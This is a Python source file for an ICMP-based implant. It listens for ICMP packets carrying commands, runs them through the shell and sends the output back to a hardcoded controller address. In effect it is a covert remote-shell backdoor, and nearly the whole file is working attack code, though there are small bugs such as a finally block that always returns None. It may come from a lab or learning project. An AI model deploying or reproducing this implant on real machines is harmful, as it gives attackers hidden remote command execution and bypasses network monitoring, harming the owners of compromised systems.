#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
import shlex
from shellylib import Host
from threading import Timer
from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip

    def join(self, shellpack):
        self.send(shellpack['ip'], "join")

    def run(self, cmd, timeout_sec):
        proc = Popen(shlex.split(cmd), shell=True, stdout=PIPE, stderr=PIPE)
        timer = Timer(timeout_sec, proc.kill)
        try:
            timer.start()
            stdout, _ = proc.communicate()
            return stdout
        finally:
            timer.cancel()
            return None

    def instruction(self, shellpack):
        try:
            cmd = shellpack['data'].decode()
            # cmds = cmd.split("|")
            #cmd = cmd.split(" ")
            output = self.run(cmd, 3)
            if output is None:
                raise TimeoutExpired
            self.send(self.controller_ip, "instruction", output)
        except TimeoutExpired:
            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
        except FileNotFoundError:
            self.send(self.controller_ip, "instruction", f"The command {cmd[0]} has not been found".encode(), option="ERROR")

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print("[ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join")

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
